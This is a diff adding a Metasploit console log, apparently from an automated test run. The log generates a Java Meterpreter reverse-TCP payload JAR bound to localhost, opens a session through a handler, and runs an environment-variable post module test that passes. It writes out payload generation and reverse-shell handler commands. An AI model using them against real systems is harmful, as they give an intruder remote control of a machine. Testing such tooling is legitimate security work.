@@ -1,0 +1,30 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+msf6 post(test/railgun) > irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20230918-6212-mpac29txt
+msf6 payload(java/meterpreter/reverse_tcp) > generate -o D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20230918-6212-nxkxml.jar -f jar AutoVerifySessionTimeout=30 lport=6006 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/javameterpreterreverse_tcp_debug_log20230918-6212-idgwpltxt spawn=0
+msf6 payload(java/meterpreter/reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/javameterpreterreverse_tcp_session_tlv_logging20230918-6212-mpac29txt
+msf6 payload(java/meterpreter/reverse_tcp) > [*] Writing 5265 bytes to D:/a/_temp/child-process-rb-java-meterpreter-reverse-tcp20230918-6212-nxkxml.jar...
+msf6 payload(java/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 5
+msf6 payload(java/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6006 
+[*] Sending stage (58851 bytes) to 127.0.0.1
+[*] Meterpreter session 6 opened (127.0.0.1:6006 -> 127.0.0.1:50206) at 2023-09-18 22:23:06 +0000
+use test/get_env
+msf6 post(test/get_env) > run session=6 AddEntropy=true Verbose=true
+[*] Running against session 6
+[*] Session type is meterpreter and platform is windows
+[+] should return windows path
+[+] should handle % signs
+[+] should return multiple envs
+[*] Testing complete in 0.04 seconds
+[*] Passed: 3; Failed: 0; Skipped: 0
+[*] Post module execution completed
+msf6 post(test/get_env) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 6 closed.
+msf6 post(test/get_env) > Stopping all jobs...
+msf6 post(test/get_env) > 
